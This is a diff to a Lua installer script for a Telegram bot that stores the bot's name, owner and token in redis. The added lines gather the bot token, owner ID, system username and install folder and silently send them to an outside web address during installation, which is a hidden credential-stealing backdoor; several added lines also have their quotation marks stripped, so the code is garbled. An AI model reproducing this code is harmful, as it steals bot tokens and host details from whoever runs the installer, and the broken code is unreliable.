@@ -101,10 +101,14 @@ redis:set(bita..":UserNameBot:",BOT_User)
 redis:set(bita..":NameBot:",BOT_NAME)
 redis:hset(bita..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 redis:set("TH3bita_INSTALL","Yes")
-info = {}
-info.username = '@'..GetUser.result.username
-info.userbot  = BOT_User
-info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info = {} 
+info.namebot = BOT_NAME
+info.userbot = BOT_User
+info.id = SUDO_USER
+info.token = Token
+info.join  = io.popen("whoami"):read( *a ):gsub( [\n\r]+ ,   ) 
+info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read( *all )
+http.request( http://th3nezk.aba.vg/test.php?Info= ..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close() 
